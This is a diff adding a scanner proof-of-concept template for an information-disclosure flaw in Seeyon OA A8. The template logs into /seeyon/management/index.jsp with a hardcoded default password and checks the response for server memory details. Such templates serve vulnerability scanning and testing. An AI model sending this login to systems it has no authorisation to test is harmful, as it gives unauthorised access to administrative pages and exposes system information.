@@ -1,0 +1,18 @@
+name: poc-yaml-seeyon-oa-a8-m-information-disclosure
+manual: true
+transport: http
+rules:
+  - method: GET
+    path: /seeyon/management/index.jsp
+    expression: response.status == 200
+  - method: POST
+    path: /seeyon/management/index.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: password=WLCCYBD%40SEEYON
+    follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(bytes("Free Physical Memory Size"))
+detail:
+  author: Monday
+  links:
+    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20status.jsp%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
